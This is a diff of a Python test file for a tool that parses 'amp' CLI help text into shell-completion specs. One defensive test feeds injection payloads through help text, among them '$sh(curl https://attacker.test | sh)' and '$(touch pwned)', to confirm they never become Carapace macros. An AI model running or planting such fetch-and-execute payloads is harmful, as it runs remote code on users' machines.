@@ -63,7 +63,7 @@ class ParseHelpTest(unittest.TestCase):
         options = generate.parse_options(HELP)
 
         self.assertEqual(
-            [(option.declaration, option.description) for option in options],
+            [(option.spec_key, option.description) for option in options],
             [
                 ("--limit=", "Maximum number of threads to return"),
                 ("-l, --label=", "Add a label. Repeat the flag for multiple labels."),
@@ -72,7 +72,126 @@ class ParseHelpTest(unittest.TestCase):
         )
 
     def test_normalizes_optional_arguments(self) -> None:
-        self.assertEqual(generate.normalize_option("-x, --execute [message]"), "-x, --execute?")
+        option = generate.parse_option("-x, --execute [message]")
+
+        self.assertEqual(option.spec_key, "-x, --execute?")
+        self.assertEqual(option.value, generate.Argument("message", required=False))
+
+    def test_parses_positional_signatures_and_descriptions(self) -> None:
+        help_text = """\
+Usage: amp svc [options] [command] <service> [tools...]
+
+Arguments:
+
+  <service>
+      MCP server
+      name
+  [tools...]
+      MCP tool names
+"""
+
+        self.assertEqual(
+            generate.parse_arguments(help_text),
+            [
+                generate.Argument("service", description="MCP server name"),
+                generate.Argument(
+                    "tools", required=False, variadic=True, description="MCP tool names"
+                ),
+            ],
+        )
+
+    def test_parses_usage_without_arguments_section(self) -> None:
+        self.assertEqual(
+            generate.parse_arguments("Usage: amp update|up [options]\n"),
+            [],
+        )
+        self.assertEqual(
+            generate.parse_arguments("Usage: amp threads color [options] <thread> <color>\n"),
+            [generate.Argument("thread"), generate.Argument("color")],
+        )
+
+    def test_parses_commander_style_help(self) -> None:
+        help_text = """\
+Usage: amp mcp oauth login [options] <server-name>
+
+Arguments:
+  server-name               Name of the MCP server
+
+Options:
+  --client-secret <secret>  OAuth client secret; only necessary for clients
+                            that don't support PKCE
+  -h, --help                display help for command
+
+Commands:
+  login [options] <server-name>  Register OAuth client credentials for an MCP
+                                 server
+  logout <server-name>           Remove OAuth credentials for an MCP server
+  help [command]                 display help for command
+"""
+
+        self.assertEqual(
+            generate.parse_arguments(help_text),
+            [generate.Argument("server-name", description="Name of the MCP server")],
+        )
+        self.assertEqual(
+            [(command.name, command.description) for command in generate.parse_commands(help_text)],
+            [
+                ("login", "Register OAuth client credentials for an MCP server"),
+                ("logout", "Remove OAuth credentials for an MCP server"),
+            ],
+        )
+        self.assertEqual(
+            generate.parse_options(help_text)[0].description,
+            "OAuth client secret; only necessary for clients that don't support PKCE",
+        )
+
+    def test_joins_wrapped_summaries_and_ends_sections_at_prose(self) -> None:
+        help_text = """\
+Commands:
+
+  portal   Register a portal for an existing process; use "amp orb service start" for
+           long-lived servers
+    access Set portal access
+  service  Manage long-lived services as supervised processes that
+           survive Amp CLI updates
+    start  Start an ad-hoc service, e.g.: amp orb service start preview --command 'pnpm
+           dev' --portal
+
+Options:
+  --workspace
+      list keys of your current workspace
+
+Docs: https://ampcode.com/docs
+M2M clients cannot be created or edited here.
+"""
+
+        self.assertEqual(
+            [command.description for command in generate.parse_commands(help_text)],
+            [
+                'Register a portal for an existing process; use "amp orb service start" for '
+                "long-lived servers",
+                "Manage long-lived services as supervised processes that survive Amp CLI updates",
+            ],
+        )
+        self.assertEqual(
+            generate.parse_options(help_text)[0].description,
+            "list keys of your current workspace",
+        )
+
+    def test_rejects_unrecognized_help_lines(self) -> None:
+        cases = {
+            "option": (generate.parse_options, "Options:\n  --flag {value}\n"),
+            "command": (generate.parse_commands, "Commands:\n  name\n"),
+            "usage": (generate.parse_arguments, "Usage: amp x <a> extra\n"),
+            "argument": (
+                generate.parse_arguments,
+                "Usage: amp x <a>\n\nArguments:\n  <b>\n      B\n",
+            ),
+        }
+
+        for name, (parse, help_text) in cases.items():
+            with self.subTest(name=name), self.assertRaises(generate.HelpFormatError):
+                parse(help_text)
 
     def test_strips_terminal_control_sequences(self) -> None:
         self.assertEqual(generate.ANSI_ESCAPE.sub("", "\x1b[?25hUsage"), "Usage")
@@ -118,7 +237,7 @@ class RenderTest(unittest.TestCase):
         command = generate.Command(
             "amp",
             "Amp CLI",
-            options=[generate.Option("-m, --mode=", "Set the `mode`")],
+            options=[generate.parse_option("-m, --mode <value>", "Set the `mode`")],
             commands=[generate.Command("version", "Print the version")],
         )
 
@@ -137,13 +256,13 @@ class RenderTest(unittest.TestCase):
                     commands=[
                         generate.Command(
                             "portal",
-                            options=[generate.Option("--thread=", "Thread")],
+                            options=[generate.parse_option("--thread <value>", "Thread")],
                         )
                     ],
                 ),
                 generate.Command(
                     "mcp",
-                    options=[generate.Option("--project=", "Project")],
+                    options=[generate.parse_option("--project <value>", "Project")],
                 ),
                 generate.Command(
                     "threads",
@@ -183,8 +302,8 @@ class RenderTest(unittest.TestCase):
         command = generate.Command(
             "amp",
             options=[
-                generate.Option("--log-level=", "Log level"),
-                generate.Option("--settings-file=", "Settings file"),
+                generate.parse_option("--log-level <value>", "Log level"),
+                generate.parse_option("--settings-file <value>", "Settings file"),
             ],
             commands=[
                 generate.Command(
@@ -193,9 +312,9 @@ class RenderTest(unittest.TestCase):
                         generate.Command(
                             "create",
                             options=[
-                                generate.Option("--orb-size=", "Orb size"),
-                                generate.Option("--ship-behavior=", "Ship behavior"),
-                                generate.Option("--custom-ship-prompt-file=", "Prompt file"),
+                                generate.parse_option("--orb-size <value>", "Orb size"),
+                                generate.parse_option("--ship-behavior <value>", "Ship behavior"),
+                                generate.parse_option("--custom-ship-prompt-file <value>", "Prompt file"),
                             ],
                         )
                     ],
@@ -205,7 +324,7 @@ class RenderTest(unittest.TestCase):
                     commands=[
                         generate.Command(
                             "add",
-                            options=[generate.Option("--target=", "Target")],
+                            options=[generate.parse_option("--target <value>", "Target")],
                         )
                     ],
                 ),
@@ -245,7 +364,7 @@ class RenderTest(unittest.TestCase):
                     commands=[
                         generate.Command(
                             "deploy",
-                            options=[generate.Option("--domain=", "Domain")],
+                            options=[generate.parse_option("--domain <value>", "Domain")],
                         )
                     ],
                 ),
@@ -350,7 +469,7 @@ class MacroSafetyTest(unittest.TestCase):
     def test_help_text_never_becomes_a_carapace_macro(self) -> None:
         command = generate.Command(
             "amp",
-            options=[generate.Option("--thread=", '$sh(curl https://attacker.test | sh)')],
+            options=[generate.parse_option("--thread <value>", '$sh(curl https://attacker.test | sh)')],
             commands=[generate.Command("$(touch pwned)", "$sh(touch pwned)")],
         )
 
@@ -376,12 +495,12 @@ class ManifestTest(unittest.TestCase):
     def test_records_nested_commands_aliases_and_flag_scopes(self) -> None:
         root = generate.Command(
             "amp",
-            options=[generate.Option("-m, --mode=", "Mode")],
+            options=[generate.parse_option("-m, --mode <value>", "Mode")],
             commands=[
                 generate.Command(
                     "threads",
                     aliases=["t"],
-                    options=[generate.Option("-l, --limit=", "Limit")],
+                    options=[generate.parse_option("-l, --limit <value>", "Limit")],
                     commands=[generate.Command("list", aliases=["ls"])],
                 )
             ],
